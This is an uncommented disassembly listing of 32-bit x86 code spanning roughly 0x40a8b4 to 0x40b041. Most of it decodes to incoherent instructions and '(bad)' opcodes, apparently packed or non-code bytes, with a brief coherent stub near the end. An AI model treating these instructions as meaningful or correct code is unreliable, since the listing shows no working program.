  40a8b4:	adc    edi,DWORD PTR [ebx+0x24e9eee8]
  40a8ba:	adc    al,BYTE PTR [ebp+0x53]
  40a8bd:	ins    DWORD PTR es:[edi],dx
  40a8be:	jmp    0x40a8cb
  40a8c0:	(bad)  
  40a8c1:	ror    DWORD PTR [ebp-0x39a0a2af],cl
  40a8c7:	ret    
  40a8c8:	lock mov bl,0x95
  40a8cb:	add    ebp,DWORD PTR [edx-0x7e]
  40a8ce:	aas    
  40a8cf:	xor    eax,0xf451c7a6
  40a8d4:	jne    0x40a87a
  40a8d6:	icebp  
  40a8d7:	xrelease mov BYTE PTR [eax-0x67babfb5],bl
  40a8de:	dec    ecx
  40a8df:	mov    ds:0x577dc34e,eax
  40a8e4:	sub    eax,0xe1de9455
  40a8e9:	pop    eax
  40a8ea:	data16 xlat BYTE PTR ds:[ebx]
  40a8ec:	mov    eax,0xe0ddf036
  40a8f1:	mov    DWORD PTR [eax],ebp
  40a8f3:	pop    edi
  40a8f4:	xor    DWORD PTR [ebx+0x285effa3],eax
  40a8fa:	adc    eax,0x4db71fe8
  40a8ff:	mov    bl,0x6f
  40a901:	mov    ebp,esi
  40a903:	mov    al,ds:0x2ac67755
  40a908:	int3   
  40a909:	ds or  al,0xd4
  40a90c:	es (bad) 
  40a90e:	fst    QWORD PTR [ecx-0x1a]
  40a911:	(bad)  
  40a912:	cwde   
  40a913:	in     eax,dx
  40a914:	mov    esi,0xd94ccdb9
  40a919:	dec    edx
  40a91a:	add    al,0xe9
  40a91c:	pop    ss
  40a91d:	xor    al,BYTE PTR [ebx+eax*2]
  40a920:	xor    bh,cl
  40a922:	pop    ecx
  40a923:	and    edi,ebx
  40a925:	cld    
  40a926:	jb     0x40a930
  40a928:	lahf   
  40a929:	loopne 0x40a92a
  40a92b:	aad    0xb6
  40a92d:	fisub  DWORD PTR [edi+0x2c]
  40a930:	dec    edi
  40a931:	cmp    al,0x31
  40a933:	loop   0x40a8c9
  40a935:	stc    
  40a936:	ss push eax
  40a938:	pusha  
  40a939:	rcr    BYTE PTR [esi+0x499798bf],0xe5
  40a940:	mov    ch,0xd2
  40a942:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a944:	and    eax,0x1836f547
  40a949:	xchg   ebp,eax
  40a94a:	test   al,0x89
  40a94c:	mov    BYTE PTR [ecx+0x1c],bh
  40a94f:	call   0x42bc:0x1d7e0c3e
  40a956:	fisub  DWORD PTR [edx-0x2a]
  40a959:	stc    
  40a95a:	dec    ebx
  40a95b:	and    DWORD PTR fs:[ebx+ecx*8+0x1d8fc80b],ecx
  40a963:	das    
  40a964:	adc    cl,BYTE PTR [ebx+0x6f7267d6]
  40a96a:	mov    eax,ds:0xfa1d3643
  40a96f:	dec    edi
  40a970:	sbb    DWORD PTR [ebp+0x60],esp
  40a973:	cli    
  40a974:	xchg   ebp,eax
  40a975:	dec    edx
  40a976:	dec    ebx
  40a977:	cmp    DWORD PTR [ecx+0xa35d293],ecx
  40a97d:	xchg   edi,eax
  40a97e:	adc    ah,ch
  40a980:	pusha  
  40a981:	out    dx,al
  40a982:	jge    0x40a946
  40a984:	call   0xf308:0xda505fe9
  40a98b:	adc    bh,BYTE PTR [esi-0x1edd1ae0]
  40a991:	push   esp
  40a992:	(bad)  
  40a993:	je     0x40a99c
  40a995:	pushf  
  40a996:	mov    esp,0xac5c7ddd
  40a99b:	mov    edx,0x335febc0
  40a9a0:	int3   
  40a9a1:	mov    ch,0x1a
  40a9a3:	mov    bl,0x35
  40a9a5:	icebp  
  40a9a6:	add    BYTE PTR [esi],al
  40a9a8:	dec    edi
  40a9a9:	scas   al,BYTE PTR es:[edi]
  40a9aa:	jp     0x40a9a4
  40a9ac:	call   DWORD PTR [ebp-0x72]
  40a9af:	mov    esi,0x76705b8b
  40a9b4:	push   esp
  40a9b5:	jae    0x40a9c5
  40a9b7:	mov    DWORD PTR [eax],esi
  40a9b9:	adc    DWORD PTR gs:[edx-0x3a],esp
  40a9bd:	adc    DWORD PTR [edi],ebp
  40a9bf:	adc    al,0x22
  40a9c1:	inc    esi
  40a9c2:	stos   BYTE PTR es:[edi],al
  40a9c3:	sbb    eax,0x840775fc
  40a9c8:	test   BYTE PTR [edx],cl
  40a9ca:	arpl   WORD PTR [edx-0x5f64e140],cx
  40a9d0:	adc    BYTE PTR [edx-0x1f],dl
  40a9d3:	inc    edi
  40a9d4:	pop    edi
  40a9d5:	loop   0x40a985
  40a9d7:	neg    edx
  40a9d9:	mov    esp,edi
  40a9db:	push   esp
  40a9dc:	sbb    ebx,DWORD PTR [esi+0x70]
  40a9df:	icebp  
  40a9e0:	and    eax,0x273d408d
  40a9e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9e6:	popa   
  40a9e7:	lea    ebp,[edx-0x1ba9629e]
  40a9ed:	mov    edx,0x1866947f
  40a9f2:	jge    0x40aa11
  40a9f4:	xor    BYTE PTR [ebx+eax*1-0x1a],ah
  40a9f8:	mov    bh,0x1
  40a9fa:	or     ecx,DWORD PTR [edi-0x2e]
  40a9fd:	xchg   esi,eax
  40a9fe:	mov    al,0x1c
  40aa00:	push   eax
  40aa01:	test   al,0x2f
  40aa03:	neg    BYTE PTR [ecx+0x644d4a38]
  40aa09:	jb     0x40aa20
  40aa0b:	xor    BYTE PTR [edi+0x54],ch
  40aa0e:	xchg   edi,eax
  40aa10:	jge    0x40a9ad
  40aa12:	push   edx
  40aa13:	xchg   esp,eax
  40aa14:	mov    bl,0x1e
  40aa16:	mov    bh,bl
  40aa18:	test   ebx,esp
  40aa1a:	mov    dl,0x48
  40aa1c:	clc    
  40aa1d:	jle    0x40a9b3
  40aa1f:	or     DWORD PTR [ebx],ecx
  40aa21:	add    al,0xb1
  40aa23:	xlat   BYTE PTR ds:[ebx]
  40aa24:	jge    0x40aa0f
  40aa26:	mov    bl,0x48
  40aa28:	mov    bh,0xa9
  40aa2a:	test   eax,0xae1d45ad
  40aa2f:	(bad)  
  40aa30:	xlat   BYTE PTR ds:[ebx]
  40aa31:	dec    edx
  40aa32:	xor    ebx,0xffffffe6
  40aa35:	and    eax,0xa51bef4
  40aa3a:	clc    
  40aa3b:	js     0x40aa3a
  40aa3d:	inc    ebp
  40aa3e:	shl    DWORD PTR [ebx],1
  40aa40:	fild   WORD PTR [eax+0x1f376034]
  40aa46:	imul   eax,DWORD PTR [ecx+0x1cce3fc0],0x8c13a08f
  40aa50:	(bad)  
  40aa51:	xor    al,0x17
  40aa53:	out    dx,al
  40aa54:	scas   eax,DWORD PTR es:[edi]
  40aa55:	es push edi
  40aa57:	add    DWORD PTR [edx-0x6a],ebx
  40aa5a:	mov    esi,0xbc829528
  40aa5f:	push   ds
  40aa60:	mov    eax,0x7b4596c9
  40aa65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa66:	inc    eax
  40aa67:	aas    
  40aa68:	shr    BYTE PTR [esi-0x37],1
  40aa6b:	ins    DWORD PTR es:[edi],dx
  40aa6c:	pop    ebp
  40aa6d:	jmp    0xb2a0:0x5834695a
  40aa74:	push   ebx
  40aa75:	jmp    0x40aa46
  40aa77:	jns    0x40aab2
  40aa79:	inc    ecx
  40aa7a:	retf   0x9dd6
  40aa7d:	pop    esp
  40aa7e:	rol    DWORD PTR [esi-0x63],1
  40aa81:	jge    0x40aa8a
  40aa83:	mov    esi,0x5f54abec
  40aa88:	cld    
  40aa89:	mov    esi,0xc94aadc
  40aa8e:	push   edx
  40aa8f:	mov    ebp,0x1864014a
  40aa94:	ret    
  40aa95:	dec    esp
  40aa96:	push   ds
  40aa97:	mov    ebx,0xba206513
  40aa9c:	adc    bl,BYTE PTR [ecx+0x21]
  40aa9f:	mov    cl,BYTE PTR [esi]
  40aaa1:	pop    ebp
  40aaa2:	or     ch,dl
  40aaa4:	or     eax,0xef9e7733
  40aaa9:	push   esi
  40aaaa:	lock sub al,0xee
  40aaad:	call   0xb1761dbb
  40aab2:	pop    ds
  40aab3:	sbb    DWORD PTR [edx+ebp*2],edx
  40aab6:	or     DWORD PTR [esi-0x7a],ebx
  40aab9:	les    eax,FWORD PTR [edi]
  40aabb:	outs   dx,BYTE PTR ds:[esi]
  40aabc:	inc    esp
  40aabd:	mov    ebp,0x23b463ff
  40aac2:	pop    ds
  40aac3:	sbb    DWORD PTR [esi],ebp
  40aac5:	in     al,0x3c
  40aac7:	rol    ah,cl
  40aac9:	jmp    0x2b26:0xdf0067f0
  40aad0:	mov    ecx,0xf3419b54
  40aad5:	outs   dx,DWORD PTR ds:[esi]
  40aad6:	aad    0x44
  40aad8:	ficom  WORD PTR [edi+0x25355137]
  40aade:	out    dx,eax
  40aadf:	mov    dl,0x88
  40aae1:	loopne 0x40aad9
  40aae3:	loope  0x40aada
  40aae5:	iret   
  40aae6:	std    
  40aae7:	fwait
  40aae8:	inc    esi
  40aae9:	shl    esi,0xc
  40aaec:	xor    ah,ah
  40aaee:	mov    DWORD PTR [ebp-0x11],0xc45c9282
  40aaf5:	cld    
  40aaf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aaf7:	clc    
  40aaf8:	add    DWORD PTR [eiz*4+0x6d7212bd],edx
  40aaff:	je     0x40ab20
  40ab01:	shl    DWORD PTR [ecx-0x62049924],0x6b
  40ab08:	mov    ds:0x64694471,eax
  40ab0d:	xchg   edi,eax
  40ab0e:	test   eax,0xaa47503f
  40ab13:	bound  ebp,QWORD PTR [esi-0x20589390]
  40ab19:	movlps xmm4,QWORD PTR [ecx]
  40ab1c:	inc    eax
  40ab1d:	adc    al,0x8e
  40ab1f:	dec    edi
  40ab20:	jle    0x40aaed
  40ab22:	push   0xffffff95
  40ab24:	call   0xe8b9:0x850d6b8f
  40ab2b:	dec    esp
  40ab2c:	jp     0x40aabd
  40ab2e:	scas   eax,DWORD PTR es:[edi]
  40ab2f:	and    BYTE PTR ds:0xfa5e98e8,ch
  40ab35:	adc    esi,DWORD PTR [esi-0x1a]
  40ab38:	mov    esi,DWORD PTR [esi-0x33cce31b]
  40ab3e:	(bad)  
  40ab3f:	ins    BYTE PTR es:[edi],dx
  40ab40:	xchg   esp,eax
  40ab41:	cmp    al,0x8a
  40ab43:	mov    edi,0x83669f02
  40ab48:	dec    edx
  40ab49:	cmp    eax,0x73017300
  40ab4e:	add    DWORD PTR [ecx-0x25],edx
  40ab51:	fistp  WORD PTR [edx-0x7c]
  40ab54:	test   ebp,edi
  40ab56:	loopne 0x40ab41
  40ab58:	xchg   esp,eax
  40ab59:	loopne 0x40ab56
  40ab5b:	dec    esi
  40ab5c:	enter  0x710b,0x6
  40ab60:	xchg   ebx,eax
  40ab61:	and    eax,0x560fb2ed
  40ab66:	mov    ecx,0x1edaa585
  40ab6b:	dec    edx
  40ab6c:	sbb    BYTE PTR [ebp-0x648ee557],cl
  40ab72:	sahf   
  40ab73:	xor    al,0xf3
  40ab75:	sbb    cl,BYTE PTR [edi+0x7c983809]
  40ab7b:	sub    bh,BYTE PTR [edx-0x3870480e]
  40ab81:	mov    esi,0xdb83869f
  40ab86:	imul   ecx,eax,0x13a0c404
  40ab8c:	sar    ebx,0x52
  40ab8f:	(bad)  
  40ab92:	mov    ebx,0x9ffea234
  40ab97:	push   es
  40ab98:	jbe    0x40abc7
  40ab9a:	ret    
  40ab9b:	in     eax,dx
  40ab9c:	and    al,0x36
  40ab9e:	cmc    
  40ab9f:	and    bh,0x2
  40aba2:	mov    BYTE PTR [eax+0xdf33b24],dh
  40aba8:	call   0x8f20b3de
  40abad:	jmp    0xaf566ab6
  40abb2:	pop    ss
  40abb3:	cli    
  40abb4:	cmc    
  40abb5:	in     eax,0x7a
  40abb7:	pusha  
  40abb8:	seto   dl
  40abbb:	fst    DWORD PTR [ecx]
  40abbd:	je     0x40ab70
  40abbf:	or     BYTE PTR [eax],ch
  40abc1:	pushf  
  40abc2:	into   
  40abc3:	push   esp
  40abc4:	call   0xebe21768
  40abc9:	jb     0x40ac36
  40abcb:	push   ss
  40abcc:	adc    al,0xf6
  40abce:	imul   ebx,eax,0xeb07fe4b
  40abd4:	mov    ds:0x38c54ba2,al
  40abd9:	sbb    BYTE PTR [ebx+0x647ed544],dl
  40abdf:	xacquire xchg DWORD PTR [ebx+esi*8],edx
  40abe3:	outs   dx,BYTE PTR ds:[esi]
  40abe4:	popf   
  40abe5:	pop    es
  40abe6:	mov    dl,0x4a
  40abe8:	fimul  DWORD PTR ds:0x758934fa
  40abee:	lea    esp,[ebp-0x5]
  40abf1:	int    0xef
  40abf3:	pop    es
  40abf4:	xor    dh,dl
  40abf6:	enter  0x478d,0xc0
  40abfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abfb:	jmp    0xa083:0xad590aaf
  40ac02:	test   BYTE PTR [esp+edi*1],bh
  40ac05:	mov    ebx,0xb3e05092
  40ac0a:	out    0xfe,al
  40ac0c:	(bad)  
  40ac0d:	jnp    0x40abc2
  40ac0f:	push   ebx
  40ac10:	clc    
  40ac11:	sub    eax,0x951e3a07
  40ac16:	sti    
  40ac17:	add    DWORD PTR [eax],esi
  40ac19:	adc    cl,BYTE PTR [eax]
  40ac1b:	es or  al,0x48
  40ac1e:	fidiv  DWORD PTR [edx-0x1182a561]
  40ac24:	inc    edx
  40ac25:	mov    BYTE PTR [eax-0x2a],al
  40ac28:	and    al,BYTE PTR [esi-0x376bb5cd]
  40ac2e:	lock div DWORD PTR [esi+0x6c]
  40ac32:	and    bh,cl
  40ac34:	xchg   ecx,eax
  40ac35:	retf   0x72a4
  40ac38:	(bad)  
  40ac39:	xchg   edx,eax
  40ac3a:	sahf   
  40ac3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac3c:	bound  edx,QWORD PTR [edi]
  40ac3e:	and    BYTE PTR [esi],ah
  40ac40:	adc    al,0xd9
  40ac42:	inc    edi
  40ac43:	stc    
  40ac44:	sbb    dl,al
  40ac46:	mov    ds:0x599142c8,eax
  40ac4b:	test   eax,0x608feec4
  40ac50:	adc    edx,eax
  40ac52:	pop    eax
  40ac53:	sbb    DWORD PTR ds:0xab015da5,0x72c40ca4
  40ac5d:	pushf  
  40ac5e:	(bad)  
  40ac5f:	dec    edi
  40ac60:	add    BYTE PTR [edx+0x5f],0xff
  40ac64:	xor    al,0xbb
  40ac66:	inc    ecx
  40ac67:	cmp    al,0x45
  40ac69:	in     eax,dx
  40ac6a:	add    dh,dl
  40ac6c:	mov    ?,WORD PTR [ecx+edi*4+0x1b3ca3b7]
  40ac73:	pop    ebp
  40ac74:	and    DWORD PTR [edx+ebp*4+0x564fc947],edx
  40ac7b:	aad    0x6e
  40ac7d:	sub    BYTE PTR [esi+edx*2+0x6c],0x21
  40ac82:	(bad)  
  40ac83:	icebp  
  40ac84:	std    
  40ac85:	es out 0xa5,al
  40ac88:	jns    0x40ac76
  40ac8a:	cli    
  40ac8b:	cmp    bh,BYTE PTR [ebx+eax*4-0x576967b7]
  40ac92:	and    DWORD PTR fs:[ecx-0x412784ac],esp
  40ac99:	lods   al,BYTE PTR ds:[esi]
  40ac9a:	outs   dx,BYTE PTR ds:[esi]
  40ac9b:	xchg   esi,eax
  40ac9c:	aaa    
  40ac9d:	(bad)  [ecx]
  40ac9f:	push   es
  40aca0:	lods   eax,DWORD PTR ds:[esi]
  40aca1:	push   cs
  40aca2:	stos   BYTE PTR es:[edi],al
  40aca3:	xchg   esp,eax
  40aca4:	ror    BYTE PTR [eax+eiz*2],1
  40aca7:	fldcw  WORD PTR [eax]
  40aca9:	dec    esi
  40acaa:	add    ch,BYTE PTR [eax+0x72b3c933]
  40acb0:	cmp    edi,DWORD PTR [edi+0x7e]
  40acb3:	les    ecx,FWORD PTR [eax+0x6039190a]
  40acb9:	sub    bh,dl
  40acbb:	jmp    0x99c9:0x38c3f34
  40acc2:	sub    BYTE PTR [edi+0x25d99ac6],bl
  40acc8:	jg     0x40ac6a
  40acca:	jno    0x40ad0c
  40accc:	jne    0x40acf5
  40acce:	mov    ch,0xdf
  40acd0:	cmp    esi,edx
  40acd2:	popf   
  40acd3:	icebp  
  40acd4:	fdivr  DWORD PTR [eax+0x20]
  40acd7:	jge    0x40acb2
  40acd9:	push   0xb7439344
  40acde:	fucomp st(7)
  40ace0:	ds loop 0x40aca2
  40ace3:	dec    edx
  40ace4:	push   edx
  40ace5:	aad    0xe5
  40ace7:	sti    
  40ace8:	das    
  40ace9:	add    al,BYTE PTR [edx-0x11]
  40acec:	fwait
  40aced:	dec    ecx
  40acee:	pop    es
  40acef:	sbb    ebp,ebp
  40acf1:	mov    WORD PTR [esi-0x4dbb5c7e],ss
  40acf7:	ror    BYTE PTR [edi-0x737f04be],1
  40acfd:	mov    ds:0xed9ab251,al
  40ad02:	jne    0x40ad7c
  40ad04:	inc    ecx
  40ad05:	push   ss
  40ad06:	shl    DWORD PTR [ebx],1
  40ad08:	push   ss
  40ad09:	push   ds
  40ad0a:	aas    
  40ad0b:	out    0x79,eax
  40ad0d:	out    dx,eax
  40ad0e:	test   al,0x6c
  40ad10:	jge    0x40acd8
  40ad12:	sub    al,bh
  40ad14:	mov    al,0x46
  40ad16:	(bad)  
  40ad17:	out    0x7,al
  40ad19:	out    0xfe,al
  40ad1b:	xor    DWORD PTR [ecx],esp
  40ad1d:	mov    ds:0x765e9378,al
  40ad22:	std    
  40ad23:	inc    esi
  40ad24:	mov    cl,0xd9
  40ad26:	sbb    bh,BYTE PTR [edx+edx*1+0x3b]
  40ad2a:	xor    esp,DWORD PTR [eax+esi*1-0x71658ac8]
  40ad31:	mov    ebp,0x92681ed6
  40ad36:	cmp    al,0xfb
  40ad38:	push   cs
  40ad39:	cmp    eax,DWORD PTR [edx+0x6]
  40ad3c:	lock adc DWORD PTR [si+0x3ac6],edx
  40ad42:	jns    0x40acfe
  40ad44:	in     al,dx
  40ad45:	mov    ah,0xc1
  40ad47:	add    BYTE PTR [eax+0x12],0x8a
  40ad4b:	add    DWORD PTR [eax+0x483f1690],ebp
  40ad51:	push   DWORD PTR [edx+0x73]
  40ad54:	int3   
  40ad55:	es jae 0x40adb6
  40ad58:	fwait
  40ad59:	dec    edx
  40ad5a:	xlat   BYTE PTR ds:[ebx]
  40ad5b:	aaa    
  40ad5c:	ins    DWORD PTR es:[edi],dx
  40ad5d:	xor    cl,BYTE PTR [edi]
  40ad5f:	adc    edi,DWORD PTR [eax+0x74757e38]
  40ad65:	mov    eax,ds:0xaa8865d9
  40ad6a:	imul   BYTE PTR [edi+0x8]
  40ad6d:	push   ss
  40ad6e:	loopne 0x40adb3
  40ad70:	xor    bh,cl
  40ad72:	xor    bh,0x8b
  40ad75:	(bad)  
  40ad76:	dec    eax
  40ad77:	ret    
  40ad78:	out    dx,eax
  40ad79:	les    ebp,FWORD PTR [ebx]
  40ad7b:	cmp    ebx,0x7f
  40ad7e:	jb     0x40ada1
  40ad80:	retf   
  40ad81:	xor    eax,0xca9e26a5
  40ad86:	std    
  40ad87:	(bad)  
  40ad89:	out    dx,eax
  40ad8a:	not    DWORD PTR [esi]
  40ad8c:	mov    WORD PTR [edi],?
  40ad8e:	or     DWORD PTR [ebx],eax
  40ad90:	pop    ss
  40ad91:	cdq    
  40ad92:	loop   0x40add0
  40ad94:	and    bh,BYTE PTR ds:[edx]
  40ad97:	jnp    0x40ad82
  40ad99:	gs pop ebx
  40ad9b:	pop    ebp
  40ad9c:	sbb    al,0x61
  40ad9e:	adc    ah,ch
  40ada0:	mov    DWORD PTR [ebx-0x53],edi
  40ada3:	xchg   esp,eax
  40ada4:	xchg   esi,eax
  40ada5:	cli    
  40ada6:	xor    BYTE PTR [ebx],cl
  40ada8:	mov    edx,0x9b81301b
  40adad:	and    ebp,DWORD PTR [ebx+0x21]
  40adb0:	out    0xe5,eax
  40adb2:	xor    edx,DWORD PTR [ebp+0x79]
  40adb5:	add    BYTE PTR [edx+0x6b66129b],0x3a
  40adbc:	pop    DWORD PTR [eax+0x6f]
  40adbf:	enter  0x77c0,0x92
  40adc3:	sti    
  40adc4:	push   0xee5baaba
  40adc9:	sti    
  40adca:	test   al,0xcf
  40adcc:	pop    esi
  40adcd:	xchg   edx,eax
  40adce:	aad    0xc9
  40add0:	imul   esi,DWORD PTR [ecx+0x7b],0xf92d50e3
  40add7:	inc    esp
  40add8:	out    dx,eax
  40add9:	push   cs
  40adda:	xchg   edx,eax
  40addb:	mov    bl,0x13
  40addd:	jbe    0x40ada0
  40addf:	in     al,0xe4
  40ade1:	dec    ebp
  40ade2:	jge    0x40ae2a
  40ade4:	sbb    dl,BYTE PTR [edi+0x67]
  40ade7:	in     eax,dx
  40ade8:	push   cs
  40ade9:	push   edx
  40adea:	fwait
  40adeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adec:	push   0x75
  40adee:	or     al,0x48
  40adf0:	jge    0x40ae61
  40adf2:	cli    
  40adf3:	add    edx,0xffffffe2
  40adf6:	xchg   edx,eax
  40adf7:	add    al,0xdf
  40adf9:	jne    0x40ad94
  40adfb:	call   0x2306:0xb623b01
  40ae02:	pop    ss
  40ae03:	sbb    edi,DWORD PTR [edx-0x4e]
  40ae06:	add    ah,BYTE PTR [edi+ebp*1-0xc0657a0]
  40ae0d:	mov    esi,0xc2a54826
  40ae12:	xor    ecx,esi
  40ae14:	leave  
  40ae15:	(bad)  
  40ae16:	sub    DWORD PTR [ebx+0x99a85ef],ebp
  40ae1c:	jg     0x40ae67
  40ae1e:	dec    ecx
  40ae1f:	mov    ah,0x34
  40ae21:	cmovs  esi,DWORD PTR [edi-0x3cdedcdb]
  40ae28:	sub    al,0x86
  40ae2a:	jp     0x40ae26
  40ae2c:	gs inc ebp
  40ae2e:	pushf  
  40ae2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae30:	and    ecx,DWORD PTR [ecx+edx*1-0x3d]
  40ae34:	mov    al,cs:0xb72f814c
  40ae3a:	push   esp
  40ae3b:	rol    BYTE PTR [eax-0x13114429],1
  40ae41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae43:	pop    ebp
  40ae44:	sbb    edx,esi
  40ae46:	add    al,0x1d
  40ae48:	mov    ebx,0x769052cc
  40ae4d:	shr    DWORD PTR [ebp+esi*4-0x40],1
  40ae51:	and    eax,0x1d1043de
  40ae56:	add    DWORD PTR ds:0x3e57c72f,ebp
  40ae5c:	nop
  40ae5d:	xchg   edi,eax
  40ae5e:	mov    edx,esp
  40ae60:	push   0x59
  40ae62:	loop   0x40ae46
  40ae64:	retf   
  40ae65:	fisub  WORD PTR [eax+0xf4a40f5]
  40ae6b:	not    cl
  40ae6d:	jmp    0xc4904103
  40ae72:	mov    eax,0x3eb638db
  40ae77:	mov    dl,0x2d
  40ae79:	cs je  0x40aeac
  40ae7c:	and    DWORD PTR [esp+edi*4],ecx
  40ae7f:	int    0x6b
  40ae81:	std    
  40ae82:	inc    ebp
  40ae83:	dec    ecx
  40ae84:	sub    DWORD PTR ss:[edx],edx
  40ae87:	fidiv  DWORD PTR [edx-0x41aedeff]
  40ae8d:	xor    BYTE PTR [edx+esi*2],ch
  40ae90:	cwde   
  40ae91:	shr    ebx,0x99
  40ae94:	shl    eax,1
  40ae96:	and    al,0xc7
  40ae98:	imul   esi,ebp,0x38
  40ae9b:	imul   eax,DWORD PTR [ebp+0x3fc58634],0x2f
  40aea2:	ja     0x40aea7
  40aea4:	pop    ebx
  40aea5:	dec    esi
  40aea6:	xlat   BYTE PTR ds:[ebx]
  40aea7:	ds dec esi
  40aea9:	pop    eax
  40aeaa:	cs jecxz 0x40aeea
  40aead:	adc    DWORD PTR [edx],ecx
  40aeaf:	inc    edx
  40aeb0:	jle    0x40aef9
  40aeb2:	mov    ebx,ecx
  40aeb4:	jmp    0x40aedd
  40aeb6:	scas   al,BYTE PTR es:[edi]
  40aeb7:	mov    ds:0x9ab8c594,al
  40aebc:	test   edi,esp
  40aebe:	mov    edx,0xbeca2fba
  40aec3:	in     al,0xd3
  40aec5:	popf   
  40aec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aec7:	pop    ebp
  40aec8:	adc    ebp,ecx
  40aeca:	or     al,0xd6
  40aecc:	add    esi,DWORD PTR [edx-0x22]
  40aecf:	cmp    ch,BYTE PTR [ecx-0x33]
  40aed2:	mov    BYTE PTR [ebp+0xdf2b192],ah
  40aed8:	xchg   esp,eax
  40aed9:	les    edx,FWORD PTR ds:0xa8420d51
  40aedf:	arpl   WORD PTR [esi],dx
  40aee1:	add    DWORD PTR [edx-0x24],0x810e6e98
  40aee8:	stos   BYTE PTR es:[edi],al
  40aee9:	push   edi
  40aeea:	jne    0x40af2a
  40aeec:	jno    0x40aede
  40aeee:	jmp    0x9070a8bd
  40aef3:	pop    edx
  40aef4:	or     bh,BYTE PTR [edi-0x35a7a408]
  40aefa:	sub    al,0x17
  40aefc:	in     eax,dx
  40aefd:	and    eax,0x750ac2fa
  40af02:	std    
  40af03:	adc    al,0x12
  40af05:	in     eax,dx
  40af06:	xchg   esp,eax
  40af07:	repnz popa 
  40af09:	in     eax,0xfd
  40af0b:	cmc    
  40af0c:	pop    es
  40af0d:	mov    edi,0xecc98b58
  40af12:	jne    0x40af91
  40af14:	dec    esp
  40af15:	(bad)  
  40af16:	jge    0x40af67
  40af18:	pop    ebx
  40af19:	xor    al,0x1
  40af1b:	int3   
  40af1c:	pop    ebx
  40af1d:	retf   0x53fd
  40af20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af21:	in     ax,dx
  40af23:	sbb    ebp,0xb6f494e4
  40af29:	dec    edi
  40af2a:	mov    ds:0x92da3ea,eax
  40af2f:	ret    
  40af30:	push   ecx
  40af31:	xor    edx,ecx
  40af33:	dec    DWORD PTR [eax+0x43905c6c]
  40af39:	xchg   BYTE PTR [ebx+0x1e],dl
  40af3c:	jnp    0x40af7d
  40af3e:	retf   0x16cf
  40af41:	push   eax
  40af42:	ret    
  40af43:	xchg   esi,eax
  40af44:	loope  0x40afc5
  40af46:	fiadd  WORD PTR [ebp+ebx*1+0x7e10750e]
  40af4d:	mov    ebx,0x873d61d6
  40af52:	std    
  40af53:	and    eax,0xb17824c7
  40af58:	mov    eax,ds:0x926d6304
  40af5d:	mov    eax,0x49416e1c
  40af62:	in     eax,0x2c
  40af64:	mov    ecx,0x71b5680b
  40af69:	and    al,0xde
  40af6b:	and    DWORD PTR [edi+0x1b4dd92f],ebp
  40af71:	call   0xb080b07d
  40af76:	adc    DWORD PTR [esi+0x6b],esi
  40af79:	ret    
  40af7a:	mov    WORD PTR [eax-0x6b27e804],gs
  40af80:	or     al,0xa0
  40af82:	dec    ebx
  40af83:	xchg   ebp,eax
  40af84:	outs   dx,BYTE PTR ds:[esi]
  40af85:	or     eax,0x2be573c0
  40af8a:	push   0x128800f0
  40af8f:	test   al,0x7b
  40af91:	sbb    dl,BYTE PTR ds:0xbe518b54
  40af97:	ins    BYTE PTR es:[edi],dx
  40af98:	fwait
  40af99:	inc    ebx
  40af9a:	cmp    bh,BYTE PTR [eax-0x57]
  40af9d:	dec    eax
  40af9e:	(bad)  
  40af9f:	push   ds
  40afa0:	cdq    
  40afa1:	aad    0xfd
  40afa3:	sub    al,0x93
  40afa5:	and    al,0x7e
  40afa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afa8:	js     0x40aff8
  40afaa:	xchg   al,ch
  40afac:	cmc    
  40afad:	aad    0x20
  40afaf:	ret    
  40afb0:	cdq    
  40afb1:	mov    al,ds:0x74c2b611
  40afb6:	xchg   esi,eax
  40afb7:	sbb    ebx,edi
  40afb9:	mov    bh,0xbb
  40afbb:	shl    DWORD PTR ds:0xef10ce07,0xdb
  40afc2:	lahf   
  40afc3:	nop
  40afc4:	int3   
  40afc5:	in     al,dx
  40afc6:	inc    edx
  40afc7:	push   ebx
  40afc8:	cmc    
  40afc9:	dec    edx
  40afca:	clc    
  40afcb:	fisttp DWORD PTR [eax-0x75]
  40afce:	inc    ebp
  40afcf:	cld    
  40afd0:	xor    eax,esi
  40afd2:	add    eax,edi
  40afd4:	mov    DWORD PTR [ebp-0x10],eax
  40afd7:	mov    ebx,0x65655
  40afdc:	add    ebx,0x3234
  40afe2:	xchg   ebx,esi
  40afe4:	xor    ebx,ebx
  40afe6:	push   esi
  40afe7:	mov    esi,ebx
  40afe9:	pop    ebx
  40afea:	mov    edx,esi
  40afec:	jmp    0x40d37e
  40aff1:	cli    
  40aff2:	mov    DWORD PTR [ecx-0x65b47dad],esi
  40aff8:	add    BYTE PTR ds:0xf929b0d0,0x25
  40afff:	push   ss
  40b000:	lock sub esp,esi
  40b003:	add    DWORD PTR [ebx-0x7c7ca1f4],0xffffffaa
  40b00a:	dec    esi
  40b00b:	cmp    DWORD PTR [edi+0x697e4121],esp
  40b011:	xor    al,0xc0
  40b013:	shl    BYTE PTR [edx+0xe375495],1
  40b019:	inc    ebx
  40b01a:	push   ebp
  40b01b:	daa    
  40b01c:	pop    ss
  40b01d:	fcmovnbe st,st(7)
  40b01f:	and    BYTE PTR [si-0x1557],ah
  40b024:	hlt    
  40b025:	and    DWORD PTR [ecx+0x6f4ab4d0],ecx
  40b02b:	jne    0x40afd0
  40b02d:	or     al,0x91
  40b02f:	lods   eax,DWORD PTR ds:[esi]
  40b030:	inc    eax
  40b031:	pop    ebp
  40b032:	xchg   esi,eax
  40b033:	jge    0x40b014
  40b035:	and    DWORD PTR [ecx],ecx
  40b037:	mov    bh,0x28
  40b039:	fisub  DWORD PTR [edx]
  40b03b:	out    dx,eax
  40b03c:	sbb    eax,0x8b0fcaf6
  40b041:	ja     0x40b067
